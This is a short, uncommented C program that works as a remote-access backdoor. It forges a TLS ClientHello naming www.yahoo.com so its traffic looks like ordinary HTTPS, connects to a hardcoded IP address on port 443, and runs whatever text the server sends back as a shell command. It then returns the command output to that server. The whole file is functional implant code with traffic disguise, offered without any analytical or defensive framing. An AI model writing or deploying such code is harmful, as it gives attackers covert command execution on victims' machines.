#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

void craft_cli_hel(unsigned char** cli_hel, int* cli_hel_s) {
    unsigned char serv_name[] = "www.yahoo.com";
    unsigned char serv_name_s = strlen(serv_name);
    unsigned char serv_list_s = serv_name_s + 3;
    unsigned char ext_serv_s = serv_list_s + 2;

    char ext_serv_pre[] = {
        0x00, 0x00,
        0x00, ext_serv_s,
        0x00, serv_list_s,
        0x00,
        0x00, serv_name_s};

    unsigned char ext_serv_ss = sizeof(ext_serv_pre) + serv_name_s;
    unsigned char* ext_serv = malloc(ext_serv_ss);
    memcpy(ext_serv, ext_serv_pre, sizeof(ext_serv_pre));
    memcpy(ext_serv + sizeof(ext_serv_pre), serv_name, serv_name_s);

    char ext_oth[] = {
        0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02, 0x00, 0x0a,
        0x00, 0x16, 0x00, 0x14, 0x00, 0x1d, 0x00, 0x17, 0x00, 0x1e,
        0x00, 0x19, 0x00, 0x18, 0x01, 0x00, 0x01, 0x01, 0x01, 0x02,
        0x01, 0x03, 0x01, 0x04, 0x00, 0x23, 0x00, 0x00, 0x00, 0x16,
        0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x1e,
        0x00, 0x1c, 0x04, 0x03, 0x05, 0x03, 0x06, 0x03, 0x08, 0x07,
        0x08, 0x08, 0x08, 0x09, 0x08, 0x0a, 0x08, 0x0b, 0x08, 0x04,
        0x08, 0x05, 0x08, 0x06, 0x04, 0x01, 0x05, 0x01, 0x06, 0x01,
        0x00, 0x2b, 0x00, 0x03, 0x02, 0x03, 0x04, 0x00, 0x2d, 0x00,
        0x02, 0x01, 0x01, 0x00, 0x33, 0x00, 0x26, 0x00, 0x24, 0x00,
        0x1d, 0x00, 0x20, 0x35, 0x80, 0x72, 0xd6, 0x36, 0x58, 0x80,
        0xd1, 0xae, 0xea, 0x32, 0x9a, 0xdf, 0x91, 0x21, 0x38, 0x38,
        0x51, 0xed, 0x21, 0xa2, 0x8e, 0x3b, 0x75, 0xe9, 0x65, 0xd0,
        0xd2, 0xcd, 0x16, 0x62, 0x54};

    unsigned char ext_s = ext_serv_ss + sizeof(ext_oth);
    unsigned char* ext = malloc(ext_s);
    memcpy(ext, ext_serv, ext_serv_ss);
    memcpy(ext + ext_serv_ss, ext_oth, sizeof(ext_oth));
    free(ext_serv);

    unsigned char cv_el[] = {
        0x03, 0x03, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11,
        0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b,
        0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0xe0, 0xe1, 0xe2, 0xe3, 0xe4,
        0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee,
        0xef, 0xf0, 0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8,
        0xf9, 0xfa, 0xfb, 0xfc, 0xfd, 0xfe, 0xff, 0x00, 0x08, 0x13,
        0x02, 0x13, 0x03, 0x13, 0x01, 0x00, 0xff, 0x01, 0x00, 0x00,
        ext_s};

    unsigned char cv_rest_s = sizeof(cv_el) + ext_s;
    unsigned char* cv_rest = malloc(cv_rest_s);
    memcpy(cv_rest, cv_el, sizeof(cv_el));
    memcpy(cv_rest + sizeof(cv_el), ext, ext_s);
    free(ext);

    char top[] = {
        0x16, 0x03, 0x01,
        0x00, cv_rest_s + 4,
        0x01, 0x00,
        0x00, cv_rest_s};

    *cli_hel_s = sizeof(top) + cv_rest_s;
    *cli_hel = malloc(*cli_hel_s);
    memcpy(*cli_hel, top, sizeof(top));
    memcpy(*cli_hel + sizeof(top), cv_rest, cv_rest_s);
    free(cv_rest);
}

int main(int argc, char const* argv[]) {
    unsigned char* cli_hel;
    int cli_hel_s;
    craft_cli_hel(&cli_hel, &cli_hel_s);

    int sock = 0, valread, client_fd;
    struct sockaddr_in serv_addr;
    char buffer[5000] = {0};
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Socket creation error \n");
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(443);

    if (inet_pton(AF_INET, "69.164.213.89", &serv_addr.sin_addr) <= 0) {
        printf("\nInvalid address/ Address not supported \n");
        return -1;
    }

    if ((client_fd = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr))) < 0) {
        printf("\nConnection Failed \n");
        return -1;
    }

    send(sock, cli_hel, cli_hel_s, 0);
    free(cli_hel);
    printf("Hello message sent\n");
    valread = read(sock, buffer, 5000);
    printf("Length: %d\nMessage: %s\n", valread, buffer);

    int link[2];
    pid_t pid;
    char foo[4096];
    int nbytes;

    if (pipe(link) == -1)
        exit(EXIT_FAILURE);

    if ((pid = fork()) == -1)
        exit(EXIT_FAILURE);

    if (pid == 0) {
        dup2(link[1], STDOUT_FILENO);
        close(link[0]);
        close(link[1]);
        execl("/bin/sh", "sh", "-c", buffer, NULL);
        exit(EXIT_FAILURE);
    } else {
        close(link[1]);
        nbytes = read(link[0], foo, sizeof(foo));
        printf("%.*s\n", nbytes, foo);
        wait(NULL);
    }

    send(sock, foo, nbytes, 0);

    close(client_fd);
    return 0;
}
